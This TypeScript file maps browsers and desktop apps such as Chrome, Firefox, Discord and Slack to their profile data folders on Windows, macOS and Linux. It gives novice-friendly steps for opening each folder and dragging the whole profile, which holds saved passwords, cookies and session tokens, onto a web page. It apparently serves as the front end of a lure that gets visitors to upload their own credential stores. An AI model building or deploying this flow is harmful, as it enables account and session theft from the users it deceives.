/**
 * Step-by-step directions for finding each app's data folder, per operating system.
 * `open` is the folder to open; `drag` is the folder inside it to drop onto the page.
 */
export type Os = 'windows' | 'mac' | 'linux';

export interface Place {
  open: string;
  drag: string;
}

export interface Guide {
  id: string;
  label: string;
  places: Record<Os, Place | null>;
}

export const GUIDES: Guide[] = [
  {
    id: 'chrome',
    label: 'Chrome',
    places: {
      windows: { open: '%LOCALAPPDATA%\\Google\\Chrome', drag: 'User Data' },
      mac: { open: '~/Library/Application Support/Google', drag: 'Chrome' },
      linux: { open: '~/.config', drag: 'google-chrome' },
    },
  },
  {
    id: 'edge',
    label: 'Edge',
    places: {
      windows: { open: '%LOCALAPPDATA%\\Microsoft\\Edge', drag: 'User Data' },
      mac: { open: '~/Library/Application Support', drag: 'Microsoft Edge' },
      linux: { open: '~/.config', drag: 'microsoft-edge' },
    },
  },
  {
    id: 'firefox',
    label: 'Firefox',
    places: {
      windows: { open: '%APPDATA%\\Mozilla\\Firefox', drag: 'Profiles' },
      mac: { open: '~/Library/Application Support/Firefox', drag: 'Profiles' },
      linux: { open: '~/.mozilla', drag: 'firefox' },
    },
  },
  {
    id: 'brave',
    label: 'Brave',
    places: {
      windows: { open: '%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser', drag: 'User Data' },
      mac: { open: '~/Library/Application Support/BraveSoftware', drag: 'Brave-Browser' },
      linux: { open: '~/.config/BraveSoftware', drag: 'Brave-Browser' },
    },
  },
  {
    id: 'opera',
    label: 'Opera',
    places: {
      windows: { open: '%APPDATA%\\Opera Software', drag: 'Opera Stable' },
      mac: { open: '~/Library/Application Support', drag: 'com.operasoftware.Opera' },
      linux: { open: '~/.config', drag: 'opera' },
    },
  },
  {
    id: 'vivaldi',
    label: 'Vivaldi',
    places: {
      windows: { open: '%LOCALAPPDATA%\\Vivaldi', drag: 'User Data' },
      mac: { open: '~/Library/Application Support', drag: 'Vivaldi' },
      linux: { open: '~/.config', drag: 'vivaldi' },
    },
  },
  {
    id: 'arc',
    label: 'Arc',
    places: {
      windows: null,
      mac: { open: '~/Library/Application Support/Arc', drag: 'User Data' },
      linux: null,
    },
  },
  {
    id: 'app',
    label: 'A desktop app',
    places: {
      windows: { open: '%APPDATA%', drag: 'the folder named after the app (for example discord, Slack, Notion or Code)' },
      mac: { open: '~/Library/Application Support', drag: 'the folder named after the app (for example discord, Slack, Notion or Code)' },
      linux: { open: '~/.config', drag: 'the folder named after the app (for example discord, Slack, Notion or Code)' },
    },
  },
];

export function detectOs(): Os {
  const ua = navigator.userAgent;
  if (/Windows/i.test(ua)) return 'windows';
  if (/Mac OS X|Macintosh/i.test(ua)) return 'mac';
  return 'linux';
}

export function openSteps(os: Os): string[] {
  if (os === 'windows') return ['Hold the Windows key and press R. A small "Run" box appears.', 'Paste the line below into it and press Enter.'];
  if (os === 'mac') return ['Click an empty spot on your desktop so Finder is in front.', 'Hold Command and Shift, then press G. Paste the line below and press Return.'];
  return ['Open your file manager (Files).', 'Press Ctrl and L, paste the line below, and press Enter.'];
}
